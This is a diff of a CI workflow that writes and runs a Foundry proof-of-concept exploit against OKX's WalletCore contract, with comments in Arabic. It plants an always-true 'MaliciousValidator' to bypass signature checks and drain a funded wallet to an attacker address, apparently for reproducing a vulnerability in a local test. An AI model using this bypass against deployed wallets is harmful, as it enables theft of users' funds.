@@ -14,8 +14,9 @@ jobs:
 
       - name: Run Exploit
         run: |
-          # 1. إنشاء الـ Validator الخبيث في مجلد التست مباشرة
+          # 1. إنشاء ملف الـ Validator في المجلد الصحيح
           cat > test/MaliciousValidator.sol <<EOF
+          // SPDX-License-Identifier: MIT
           pragma solidity ^0.8.23;
           contract MaliciousValidator {
               function validate(bytes32, bytes calldata) external pure returns (bool) { return true; }
@@ -23,8 +24,9 @@ jobs:
           }
           EOF
 
-          # 2. إنشاء ملف الاختبار البسيط
+          # 2. إنشاء ملف الـ Exploit مع تصحيح الـ Imports بناءً على هيكلة OKX
           cat > test/ExploitFinal.t.sol <<EOF
+          // SPDX-License-Identifier: MIT
           pragma solidity ^0.8.23;
           import "forge-std/Test.sol";
           import "../src/WalletCore.sol";
@@ -33,23 +35,30 @@ jobs:
 
           contract ExploitFinal is Test {
               WalletCore wallet;
+              address attacker = address(0xBAD);
+
               function setUp() public {
+                  // إنشاء المحفظة ووضع رصيد 10 ETH
                   wallet = new WalletCore(address(0x1), "OKX", "1.0.0");
                   vm.deal(address(wallet), 10 ether);
               }
+
               function testSignatureBypass() public {
                   MaliciousValidator m = new MaliciousValidator();
-                  Call[] memory c = new Call[](1);
-                  c[0] = Call({target: address(0xBAD), value: 10 ether, data: ""});
                   
+                  // تجهيز الهجوم لسحب الرصيد
+                  Call[] memory c = new Call[](1);
+                  c[0] = Call({target: attacker, value: 10 ether, data: ""});
+                  
+                  // تنفيذ الثغرة: تمرير الـ Validator الخبيث وتوقيع وهمي
                   wallet.executeWithValidator(c, address(m), hex"00");
                   
-                  assertEq(address(0xBAD).balance, 10 ether);
+                  // التأكد من وصول الرصيد للمهاجم
+                  assertEq(attacker.balance, 10 ether, "Exploit Failed: Attacker did not receive funds");
+                  assertEq(address(wallet).balance, 0, "Exploit Failed: Wallet not drained");
               }
           }
           EOF
 
-          # 3. التشغيل مع تجاهل التحذيرات والأخطاء الجانبية
-          forge test --match-path test/ExploitFinal.t.sol -vvv --no-compile
-          # إذا فشل الأمر أعلاه جرب بدون --no-compile
-          forge test --match-path test/ExploitFinal.t.sol -vvv
+          # 3. التشغيل النهائي (بدون --no-compile) مع إظهار تفاصيل الـ Trace
+          forge test --match-path test/ExploitFinal.t.sol -vvvv
